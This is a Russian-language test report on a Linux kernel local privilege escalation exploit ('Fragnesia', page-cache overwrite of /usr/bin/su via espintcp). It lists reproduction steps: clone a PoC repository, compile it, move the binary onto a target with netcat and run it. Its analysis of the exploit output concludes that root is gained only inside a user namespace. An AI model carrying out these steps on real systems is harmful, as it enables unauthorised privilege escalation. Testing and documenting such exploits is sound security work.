# Тест эксплойта Fragnesia (LPE via espintcp page cache replace)

## Что проверялось
Попытка локального повышения привилегий с пользователя `ksb` (uid=1000) до `root` (uid=0) через уязвимость в ядре (подмена страниц кэша для `/usr/bin/su`).

## Результат
**НЕ УСПЕШНО** (частично)

- `whoami` показывает `root`
- `id` показывает `uid=0(root)`
- НО: root работает внутри `userns` (user namespace)
- Реального контроля над системой нет — `apt install`, запись в `/root`, нормальный шелл — НЕ РАБОТАЮТ

Проверка:
```
cat /proc/self/uid_map
0       1000          1
```

Метка процесса осталась в исходном namespace, реальный root не получен.

## Как повторять

### 1. Скачать эксплойт
```
git clone https://github.com/v12-security/pocs.git
cd pocs/fragnesia
```

### 2. Скомпилировать
```
gcc -o exp fragnesia.c
```

### 3. Запустить слушатель (в другом терминале, на том же IP)
```
nc -l -p 1234 < exp
```

### 4. На целевой машине (уязвимой) выполнить
```
nc 10.** 1234 > fragnesia
chmod +x fragnesia
./fragnesia
```
ИЛИ если компилировали прямо на цели:
```
./exp
```

## Что происходит при запуске (разбор вывода)

1. Эксплойт ищет `/usr/bin/su` и подготавливает shellcode (192 байта)
2. Пишет в `read-only page cache`:
   ```
   [*] smashing 192 bytes into read-only page cache
   [==================================================] 192/192 (100%)
   [+] BUG: changed requested copied byte range to desired values
   ```
3. После срабатывания `espintcp_splice` появляется приглашение `root@astra-1:...#
4. Но сразу видно проблему:
   ```
   bash: /root/.bashrc: Permission denied
   ```
5. Дальше `apt install gcc` — ошибка:
   ```
   E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
   ```
6. `ls -la /var/lib/dpkg/` показывает владельца `nobody:nogroup` — root внутри userns не может писать

## Вывод
Эксплойт **обманывает проверку UID**, но не даёт реального контроля над системой. Для практического использования непригоден.

## Источник
https://github.com/v12-security/pocs/tree/main/fragnesia
